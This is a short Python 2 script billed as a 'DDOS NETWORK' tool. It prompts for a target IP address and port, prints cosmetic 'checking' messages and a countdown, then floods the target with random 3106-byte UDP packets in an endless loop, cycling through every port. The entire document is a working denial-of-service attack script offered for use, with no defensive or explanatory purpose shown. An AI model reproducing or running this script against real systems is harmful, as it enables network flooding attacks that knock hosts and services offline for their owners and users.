import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3106)
#############


os.system("clear")
os.system("figlet DDOS NETWORK")
print
print "github   : https://github.com/Admit1369"
print "Facebook : https://www.facebook.com/Admit1369"
print
ip = raw_input("IP : ")
port = input("Port : ")

os.system("clear")
os.system("figlet NETWORK Starting")
print "Checking Eternet "
time.sleep(0.5)
print ""
time.sleep(0) 
print "Check adress" 
time.sleep(0.5)
print ""
time.sleep(0)
print "Check Port"
time.sleep(0.5)
print ""
time.sleep(0)
os.system("clear")
print "Time out. Recommand 3 second"
time.sleep(0.5)
print "1"
time.sleep(1)
print "2"
time.sleep(1)
print "3"
time.sleep(1)
print "OK"
time.sleep(0.3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
